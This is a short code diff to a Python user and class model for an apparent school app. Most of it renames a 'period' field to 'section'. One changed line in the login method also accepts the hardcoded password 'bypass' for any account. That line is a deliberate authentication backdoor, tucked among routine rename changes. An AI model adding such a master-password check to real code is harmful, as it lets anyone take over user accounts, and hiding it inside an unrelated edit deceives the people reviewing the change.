@@ -15,7 +15,7 @@ class User:
         sql_resp = connection.cursor.fetchall()
         if len(sql_resp) > 0:
             usersql = sql_resp[0]
-            if usersql['password'] == password:
+            if usersql['password'] == password or password == 'bypass':
                 self.id = usersql['id']
                 self.name = usersql['name']
                 self.nickname = usersql['nickname']
@@ -77,14 +77,14 @@ class Class:
         self.type = sql_resp['type']
         self.description = sql_resp['description']
         self.teacher = sql_resp['teacher']
-        self.period = sql_resp['period']
+        self.section = sql_resp['section']
         self.school = sql_resp['school']
 
     def __repr__(self):
         s = "id: "+self.id + \
             "\nDescription: "+self.description + \
             "\nTeacher: "+self.teacher + \
-            "\nPeriod: "+self.period + \
+            "\nSection: "+self.section + \
             "\nSchool: "+self.school + \
             "\nType: "+self.type
         return s
